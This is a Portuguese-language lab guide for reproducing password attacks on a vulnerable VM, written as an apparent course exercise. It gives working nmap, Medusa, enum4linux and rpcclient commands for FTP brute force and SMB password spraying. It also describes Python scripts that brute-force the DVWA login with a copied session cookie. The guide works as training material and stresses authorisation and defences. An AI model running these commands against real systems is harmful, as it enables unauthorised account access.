# Comandos e procedimentos de reprodução

Este roteiro se destina às VMs do laboratório descrito. Os resultados efetivamente observados estão no [relatório](03-relatorio.md); não confunda uma instrução de reprodução com prova de execução.

## 1. Preparar e reconhecer

Copie a pasta do projeto para ~/dio-kali-medusa no Kali. Confirme o IP no console do alvo antes de definir ALVO:

```bash
cd ~/dio-kali-medusa
mkdir -p resultados wordlists
ALVO=192.168.56.103
ping -c 3 "$ALVO"
nmap -sT -sV -p 21,80,139,445 "$ALVO" -oN resultados/01-servicos.txt
```

O Nmap reconhece portas e serviços; banners não demonstram por si só exploração de uma vulnerabilidade. O resultado observado identificou FTP, HTTP e SMB. O aviso de DNS não impediu a varredura por IP.

## 2. FTP: três senhas para um usuário

```bash
printf '%s\n' '123456' 'admin' 'msfadmin' > wordlists/senhas-ftp.txt
medusa -h "$ALVO" -u msfadmin -P wordlists/senhas-ftp.txt \
  -M ftp -t 1 -f 2>&1 | tee resultados/02-ftp.log
```

-u informa um usuário; -P aponta para a lista de senhas; -M seleciona o módulo; -t 1 limita threads de login; -f encerra o teste no host após o primeiro sucesso. A lista contém três candidatas públicas de laboratório.

Se houver ACCOUNT FOUND, confirme com o cliente:

```bash
ftp "$ALVO"
```

Informe o usuário e a senha no prompt. Confira a mensagem 230, execute pwd e encerre com quit. No teste observado, o diretório foi /home/msfadmin. Não foram realizadas transferências de arquivos.

## 3. DVWA Low: sessão e respostas explícitas

No Firefox do Kali, entre no DVWA, ajuste Security para Low e abra Brute Force. Confira manualmente os marcadores de resposta. No estudo, admin/123456 falhou e admin/password foi aceito antes da automação.

A lista fornecida contém:

```text
123456
admin
password
```

Nas ferramentas de desenvolvedor do navegador, consulte o armazenamento de cookies do endereço local e copie somente o valor de PHPSESSID. Não envie nem publique o cookie. O script o recebe em um prompt oculto.

### Script guiado

```bash
python3 scripts/dvwa_guiado.py 2>&1 | tee resultados/02-dvwa.log
```

Essa versão fixa o alvo em 192.168.56.103, usa admin e lê wordlists/senhas-dvwa.txt a partir da localização do script. Permite de uma a três candidatas. Se o alvo confirmado tiver outro IP, utilize a alternativa parametrizável.

### Alternativa parametrizável

```bash
python3 scripts/dvwa_lab.py --target "$ALVO" --username admin \
  --wordlist wordlists/senhas-dvwa.txt
```

Essa alternativa aceita somente IPv4 literal nas faixas RFC1918 e até dez candidatas. Endereço privado não substitui a confirmação de que o sistema pertence ao laboratório autorizado.

Ambos os scripts desta publicação usam a biblioteca padrão, ignoram proxies, recusam redirecionamentos, verificam o formulário e o nível Low e param diante de token inesperado ou resposta ambígua. O intervalo entre candidatas é de pelo menos um segundo. A senha e o cookie não são impressos; a posição corresponde à linha da lista.

| Código de saída | Significado |
| --- | --- |
| 0 | Marcador explícito de sucesso para o usuário informado. |
| 1 | Todas as candidatas receberam marcador explícito de falha. |
| 2 | Inconclusivo: entrada, sessão, rede, HTTP ou página inesperada. |
| 130 | Interrupção pelo operador. |

Os scripts foram reconstituídos após a recriação do ambiente de montagem e verificados localmente com respostas simuladas. Não foram reexecutados contra o DVWA; as saídas históricas do relatório pertencem à execução anterior observada nas capturas.

O tee sem -a substitui um arquivo existente. Use outro nome para preservar execuções anteriores. Um resultado inconclusivo não prova proteção contra adivinhação de senhas.

## 4. SMB: enumeração e uma rodada de spraying

```bash
enum4linux -U "$ALVO" 2>&1 | tee resultados/03-smb-enumeracao.log
```

Use somente nomes realmente observados. Neste laboratório, foram selecionados msfadmin, service e ftp:

```bash
printf '%s\n' 'msfadmin' 'service' 'ftp' > wordlists/usuarios-smb.txt
printf '%s\n' 'msfadmin' > wordlists/spray-uma-senha.txt
wc -l wordlists/spray-uma-senha.txt
```

O arquivo de senha deve ter exatamente uma entrada, terminada em quebra de linha, sem comentários ou linhas vazias. Isso define uma rodada de uma senha para diferentes usuários:

```bash
medusa -h "$ALVO" -U wordlists/usuarios-smb.txt \
  -P wordlists/spray-uma-senha.txt -M smbnt \
  -m GROUP:LOCAL -t 1 -T 1 \
  2>&1 | tee resultados/04-smb-spray.log
```

GROUP:LOCAL seleciona contas locais. -t 1 e -T 1 limitam concorrência, mas não garantem um intervalo fixo. A opção -L altera a distribuição de usuários entre threads; ela não transforma uma lista de várias senhas em spraying. Não foram automatizadas novas rodadas.

### Confirmar identidade

```bash
rpcclient -U msfadmin -c getusername "$ALVO" \
  2>&1 | tee resultados/05-smb-validacao.log
```

Informe a senha no prompt. No estudo, a primeira tentativa apresentou smb1_signing_good: BAD SIG e NT_STATUS_ACCESS_DENIED. A hipótese de compatibilidade foi investigada somente naquela execução:

```bash
rpcclient -U msfadmin \
  --option='client ipc signing=disabled' \
  -c getusername "$ALVO" \
  2>&1 | tee resultados/05b-smb-validacao.log
```

A consulta observada retornou Account Name: msfadmin, Authority Name: VULNERABILITY. Em outra reprodução, confira o resultado efetivo. Desativar assinatura foi diagnóstico de compatibilidade no laboratório, não mitigação. Não aplique globalmente esse ajuste no smb.conf.

Uma listagem de compartilhamentos isolada não comprova identidade, pois pode permitir guest. A expressão ADMIN$ no Medusa não comprova privilégios administrativos gerais ou root. A validação documentada consultou a identidade, sem escrita ou administração de compartilhamentos.

Referências: [Samba](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html) e [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html).

## 5. Encerrar e avaliar

Registre comandos, saídas, configurações, limites e erros. Os logs brutos não integram esta publicação; as saídas do relatório são transcrições. Mantenha credenciais pessoais e cookies fora do repositório.

Defesas recomendadas incluem remoção de padrões, limites de tentativas, monitoramento, atualização dos serviços e restrição por rede. Se aplicadas posteriormente, use uma cópia/snapshot e documente o reteste. Nenhuma defesa ou reteste foi executado no estudo original.
